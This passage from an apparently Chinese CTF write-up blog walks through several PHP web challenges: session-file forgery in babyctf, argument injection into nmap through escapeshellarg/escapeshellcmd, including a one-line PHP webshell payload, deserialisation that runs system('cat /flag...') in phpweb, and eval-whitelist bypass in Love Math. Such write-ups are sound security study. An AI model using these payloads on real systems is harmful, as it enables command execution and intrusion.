        <span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename_sha256(tmp_name)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir_path</span><span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">,</span> <span class="token constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token string">"uploaded"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> 


<span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string">"download"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span><span class="token punctuation">{</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'file not exist'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: application/force-download'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Length: '</span><span class="token punctuation">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition: attachment; filename="'</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token string">"downloaded"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>分析代码，得到flag的条件为session的username为admin且success,txt存在。</p>
<p>而且检测success.txt的file_exists()函数的特点意味着我们建立一个同名文件夹也可以满足条件。</p>
<p><a href="https://imgchr.com/i/0aTfpD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aTfpD.png" srcset="/img/loading.gif" alt="0aTfpD.png"></a></p>
<p>三个传参，direction控制文件上传和下载；attr为新建文件夹名；filename为读取的文件名。</p>
<p>先抓个包看一下session以及它文件中的内容：</p>
<p><a href="https://imgchr.com/i/0aTKfS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aTKfS.png" srcset="/img/loading.gif" alt="0aTKfS.png"></a></p>
<p><a href="https://imgchr.com/i/0aTYT0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aTYT0.png" srcset="/img/loading.gif" alt="0aTYT0.png"></a></p>
<p>这个格式的序列化是php_binary引擎。</p>
<p>综上，大概思路就是：上传一个伪装成admin的session文件，再创建一个名为sucess,txt的文件夹即可满足条件。</p>
<p>重点代码</p>
<pre class=" language-php"><code class="language-php">        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename</span>

        <span class="token variable">$file_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"_"</span><span class="token punctuation">.</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string">"sha256"</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename_sha256(tmp_name)</span></code></pre>
<p>也就是说，我们这里让伪造成admin的session文件命名为sess进行上传。</p>
<p>然后用脚本求出hash,并改动PHPSESSID就可以达成第一个条件。</p>
<p><a href="https://imgchr.com/i/0aLnxO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aLnxO.png" srcset="/img/loading.gif" alt="0aLnxO.png"></a></p>
<p>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
<p>用postman进行上传</p>
<p><a href="https://imgchr.com/i/0dPwa8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0dPwa8.png" srcset="/img/loading.gif" alt="0dPwa8.png"></a></p>
<p>验证一下，已经传上去了</p>
<p><a href="https://imgchr.com/i/0dPbs1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0dPbs1.png" srcset="/img/loading.gif" alt="0dPbs1.png"></a></p>
<p>现在再给attr传success.txt创建文件夹；</p>
<p><a href="https://imgchr.com/i/0dinzj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0dinzj.png" srcset="/img/loading.gif" alt="0dinzj.png"></a></p>
<p>bp这边改下session，得到flag。</p>
<p><a href="https://imgchr.com/i/0diLlj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0diLlj.png" srcset="/img/loading.gif" alt="0diLlj.png"></a></p>
<h1 id="2020-网鼎杯-朱雀组-Web-nmap"><a href="#2020-网鼎杯-朱雀组-Web-nmap" class="headerlink" title="2020-网鼎杯-朱雀组-Web-nmap"></a>2020-网鼎杯-朱雀组-Web-nmap</h1><p> <strong>考点：参数逃逸，nmap使用</strong></p>
<p>打开就是nmap扫描，查看源码发现提示 /flag</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5CUsers%5C12986%5CDesktop%5C3.png" srcset="/img/loading.gif" alt="3"></p>
<p>nmap这类题会想到的两个函数：</p>
<pre><code>string escapeshellarg ( string $arg )
string escapeshellcmd ( string $command)</code></pre><p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
<p>转义字符串$arg中的单引号并使用单引号包裹此部分</p>
<p>使得$arg只能传递一个参数，且不能执行不同的命令；</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011162454612.png" srcset="/img/loading.gif" alt="image-20201011162454612"></p>
<p><strong>escapeshellcmd</strong> — shell 元字符转义</p>
<p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</p>
<p>转义&amp; # ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ 、x0A和xF，’和”仅在落单时被转义</p>
<p>使得$command只能执行一个命令，但可以传递多个参数；</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011163816415.png" srcset="/img/loading.gif" alt="image-20201011163816415"></p>
<p>然而这两个函数一起出现就会存在问题（arg先，cmd后），如图，文本被分为三个部分：</p>
<p>简化后为：<strong>12\ 3&#39;</strong></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011165732532.png" srcset="/img/loading.gif" alt="image-20201011165732532"></p>
<p>综上可以构造payload:</p>
<pre><code>127.0.0.1&#39; -iL /flag -oN aaa.txt &#39;</code></pre><p>本地测试如下：</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011175635921.png" srcset="/img/loading.gif" alt="image-20201011175635921"></p>
<p>访问aaa.txt，得到flag。这里也可以看到最后执行的命令。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011175837439.png" srcset="/img/loading.gif" alt="image-20201011175837439"></p>
<p>网上的其他做法是传马；</p>
<p>payload</p>
<pre><code>&#39; &lt;?= @eval($_POST[&quot;pd&quot;]);?&gt; -oG pd.phtml &#39;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011182343649.png" srcset="/img/loading.gif" alt="image-20201011182343649"></p>
<h1 id="2020-网鼎杯-朱雀组-Web-phpweb"><a href="#2020-网鼎杯-朱雀组-Web-phpweb" class="headerlink" title="2020-网鼎杯-朱雀组-Web-phpweb"></a>2020-网鼎杯-朱雀组-Web-phpweb</h1><p>主页东西很少，页面定时提交表单刷新。</p>
<p>抓个包看一下,应该是执行的函数和他的传参</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011194538663.png" srcset="/img/loading.gif" alt="image-20201011194538663"></p>
<p>用eval执行phpinfo被拦住了，需要绕过waf。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011194803464.png" srcset="/img/loading.gif" alt="image-20201011194803464"></p>
<p>先读一下index.php</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011195421461.png" srcset="/img/loading.gif" alt="image-20201011195421461"></p>
<pre class=" language-php+HTML"><code class="language-php+HTML"><!DOCTYPE html>
<html>
<head>
    <title>phpweb</title>
    <style type="text/css">
        body {
            background: url("bg.jpg") no-repeat;
            background-size: 100%;
        }
        p {
            color: white;
        }
    </style>
</head>

<body>
<script language=javascript>
    setTimeout("document.form1.submit()",5000)
</script>
<p>
    <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
</p>
<form  id=form1 name=form1 action="index.php" method=post>
    <input type=hidden id=func name=func value='date'>
    <input type=hidden id=p name=p value='Y-m-d h:i:s a'>
</body>
</html></code></pre>
<p>能禁的基本都禁了。</p>
<p>但这个gettime方法里有call_user_func函数，再加上本身有个Test类，那就可以用反序列化了。</p>
<pre><code>&lt;?php
    class Test {
        var $p = &quot;ls&quot;;
        var $func = &quot;system&quot;;
    }
$a=new Test();
echo serialize($a);
?&gt;</code></pre><p>payload如下，可以看到执行成功；</p>
<pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011200952514.png" srcset="/img/loading.gif" alt="image-20201011200952514"></p>
<p>相似的，查看根目录再读取flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011201319348.png" srcset="/img/loading.gif" alt="image-20201011201319348"></p>
<p>payload:</p>
<pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:20:&quot;cat /flag_2911028111&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011201411539.png" srcset="/img/loading.gif" alt="image-20201011201411539"></p>
<h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="CISCN-2019-初赛-Love Math"></a>CISCN-2019-初赛-Love Math</h1><p>进来给了源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//例子 c=20-1</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span> <span class="token string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span><span class="token punctuation">,</span> <span class="token string">'dechex'</span><span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//帮你算出答案</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>对传参的限制：</p>
<p>①八十个字符以内</p>
<p>②黑名单以下字符</p>
<pre class=" language-php"><code class="language-php">    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<p>③将含有字母或‘ _ ’的字段赋值给存入$used_funcs数组，查找其是否在白名单的函数中,不存在就die掉：</p>
<pre class=" language-php"><code class="language-php">    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span> <span class="token string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span><span class="token punctuation">,</span> <span class="token string">'dechex'</span><span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<p>满足以上条件则放入eval执行并输出。</p>
<p>首先的想法肯定是通过进制转换然后构造可利用的payload。</p>
<h4 id="思路一-直接执行命令："><a href="#思路一-直接执行命令：" class="headerlink" title="思路一 直接执行命令："></a>思路一 直接执行命令：</h4><p>先看白名单中可以使用的函数：</p>
<p><strong>base_convert()</strong></p>
<p>测试后十进制和三十六进制之间的转换是最稳妥的，其他不好说。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201011190545815.png" srcset="/img/loading.gif" alt="image-20201011190545815"></p>
<p><strong>hexdec()</strong></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201014181238707.png" srcset="/img/loading.gif" alt="image-20201014181238707"></p>
<p>由于base_convert函数名过长， 我们将它赋到变量中，变量名选择白名单中函数名最短的，即$pi。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201014182357000.png" srcset="/img/loading.gif" alt="image-20201014182357000"></p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1751504350</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span>cat f<span class="token operator">*</span><span class="token punctuation">)</span></code></pre>
<p>但这个函数并不能转换出像’ * ‘，’  . ‘这样的符号，先用异或构造试试。</p>
<p>本地用bp跑一下</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201014214026752.png" srcset="/img/loading.gif" alt="image-20201014214026752"></p>
<p>也不行。</p>
<p>但可以用dechex函数把十进制转换为十六进制，再用异或构造一个hex2bin函数将十六进制转为字符串。</p>
